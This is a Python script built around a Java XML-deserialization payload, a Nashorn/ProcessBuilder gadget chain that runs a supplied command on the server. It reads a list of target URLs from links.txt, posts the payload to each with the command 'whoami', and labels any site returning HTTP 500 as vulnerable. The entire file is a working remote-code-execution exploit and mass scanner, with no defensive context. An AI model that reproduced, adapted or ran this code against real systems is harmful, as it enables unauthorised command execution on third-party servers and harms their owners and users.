import requests
import re,sys

def pwn(url,cmd):	
	headers = {"Content-Type":"application/xml"}
	data = '''<map> 
	<entry> 
	<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>{cmd}</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> 
	</entry> 
	</map> 
	'''.format(cmd=cmd)
	try:
		r = requests.post(url,data=data,headers=headers,timeout=5)
		if r.status_code == 500:		
			return 1			
		else:
			return 0
	except:
		return 0

def loadLinks():
	try:
		with open('links.txt','r') as f:
			return f.read().split('\n')
	except:
		sys.stdout.write('No \033[1;33mlinks.txt\033[0m here!')
		#print 'No \033[1;33mlinks.txt\033[0m here!'
		sys.exit(0)

def main():
	links = loadLinks()
	for x in links:
		if pwn(x,'whoami'):
			sys.stdout.write('\033[1;31mVul\033[0m\t'+x+'\n')
			#print '\033[1;31mVul\033[0m\t'+x+'\n'
		else:
			sys.stdout.write('\033[1;32mNot vul\033[0m\t'+x+'\n')
			#print '\033[1;32mNot vul\033[0m\t'+x+'\n'

main()